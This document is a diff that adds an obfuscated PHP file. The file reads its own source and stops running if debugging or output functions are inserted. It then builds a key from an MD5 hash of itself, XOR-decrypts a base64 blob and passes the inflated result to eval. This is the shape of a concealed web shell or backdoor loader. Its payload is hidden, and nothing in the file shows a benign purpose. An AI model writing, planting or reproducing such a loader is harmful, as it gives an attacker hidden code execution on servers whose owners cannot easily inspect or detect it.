@@ -1,0 +1,24 @@
+<?php
+$grslrhwxxdo="635c5e917f41f949d8d89b8a857b44d4";
+$vgphpqttfnoq="5500075051075a09545002005f0c040b010d5c0c0e520c075953540401020550";
+$gixoasqnkoj="9mbzQf9Sc8V2o0e8RB0I/NEy49R0Dxf1sG5CJrh27UC/SwjKk0xx4AN+qm09fd/fj9gGvXJ5atdXQgROdz1LFLFDo9l7E6005QONhWNdmirO40O0A3qFrAGnLSqBqnJzYQN9LoJ7Uw0wIgYH2z0ukKAQJ9RPqVe7BX8cY53JgYty/OLZbiNSQj+VSV+POiqRKMWLqYqRC2Sca1LH7DLf+eJcH89pfwBMUxInnUSfRnoENRTmvXZqyCk7E3wTChbBgmac8KdzxwHeHi50B/Nxb4ArCug/Jk1wGTW27KHh62aicHarrJEzMOp1re838AbMaSiVOvCKnDvwoIZg2N18JLkDKpwYJbE59lMfmvm3TCmmECKlbGov0cyOzaH5csjA0sgBBTalymr929dCNL9wNf8mqga/9F+lBOPwFa965RGmO19optwqsdGzjJaA3hqQ510lTRCeifj0L6ZuGGzyTPoF5t3kSuawJT2+48qoK+I6q6IWxYav61asuJMKNFIBJ6ZMdP865Gs63wYSrQxbPt9Ia9Q+RdzVvz9wHGpdNgC7zKEcD8ye3yI726H9YrRnm3fHJDwLsK8Gwr5+dQdMf1tWCJsBv2vqtYeB4r77KSL89z2IuFhjJyJllw1owRukpiZBMdq/a6DQ8nuqRliOSXrYwMaxrU0+69On9vF8uelpzVyjKKux2Q5xOh4gs30rydn5X7gEeMGFWvl73S1MJfgt3EZsajxUbgbCXWLjE786wFRTde0c+vucgdt0cuNupgE6O5MjY6Hs6ykXi/HORYbG7G5A2WYjgtIoBHpDZRb7yh+orlLWFH+eTlDew+qPtlBeDsIRTYlL/P/Z3sEe";
+$xcyxvlzlafkd=file_get_contents(__FILE__);
+$goyzhlbba=str_replace($gixoasqnkoj,"",$xcyxvlzlafkd);
+if(strpos($goyzhlbba,"ec"."ho")!==false||strpos($goyzhlbba,"pr"."int")!==false||strpos($goyzhlbba,"var_"."dump")!==false||strpos($goyzhlbba,"file_put_"."contents")!==false||strpos($goyzhlbba,"fw"."rite")!==false){die();}
+$rrnqfibea=str_replace(array($grslrhwxxdo,$vgphpqttfnoq),array("SP_2bc0199e","KP_e89908ca"),$xcyxvlzlafkd);
+$nfnxxrqa=md5($rrnqfibea);
+$pjskvcgxtv=hex2bin($vgphpqttfnoq);
+$lswluqepvasv="";
+$codbgbmyyq=strlen($nfnxxrqa);
+for($wkihmiaqss=0;$wkihmiaqss<$codbgbmyyq;$wkihmiaqss++){
+    $lswluqepvasv.=chr(ord($pjskvcgxtv[$wkihmiaqss])^ord($nfnxxrqa[$wkihmiaqss]));
+}
+$yvzcienn=base64_decode($gixoasqnkoj);
+$xtzhiyrfglro=strlen($yvzcienn);
+$njhsoiasechc="";
+$eaddlymwt=strlen($lswluqepvasv);
+for($wkihmiaqss=0;$wkihmiaqss<$xtzhiyrfglro;$wkihmiaqss++){
+    $njhsoiasechc.=$yvzcienn[$wkihmiaqss]^$lswluqepvasv[$wkihmiaqss%$eaddlymwt];
+}
+$eiurbywpt="gz"."in"."fl"."ate";
+eval($eiurbywpt($njhsoiasechc));
